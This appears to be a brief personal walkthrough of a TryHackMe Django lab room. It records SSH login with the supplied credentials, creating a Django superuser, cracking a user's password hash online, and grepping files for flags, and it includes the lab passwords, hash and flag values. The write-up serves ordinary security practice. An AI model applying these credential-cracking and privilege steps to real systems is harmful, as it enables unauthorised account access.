@@ -1,0 +1,39 @@
+Date:apr/5/2021
+time:13:58
+
+crediantials are given just do ssh thing
+└─$ ssh django-admin@10.10.126.187                
+Password: roottoor1212
+
+django-admin@py:/home/StrangeFox$ cat user.txt 
+THM{SSH_gUy_101}
+
+django-admin@py:~/messagebox/messagebox$ nano settings.py 
+in this ip address of the django 
+refrest 10.10.224.168:8000/admin
+you go to login page
+
+django-admin@py:~/messagebox$ python3 manage.py 
+django-admin@py:~/messagebox$ python3 manage.py createsuperuser
+Username (leave blank to use 'django-admin'): liki
+Email address: 
+Password: 
+Password (again): 
+go to login page do login
+
+admin panel flag
+http://10.10.224.16:8000/admin/auth/user/
+THM{DjanGO_Adm1n}
+
+
+Username: StrangeFox
+	Password hash: https://pastebin.com/nmKt4BSf
+C06029563B2765020613F5BF79FC528344FFA039EF1483D0C390786D8010C630
+go to crackstation crack the hash
+got passord: WildNature
+
+now do ssh
+
+django-admin@py:~/messagebox$ grep -r 'THM'
+messagebox/home.html:	<!-- Flag 3: THM{django_w1zzard} -->
+
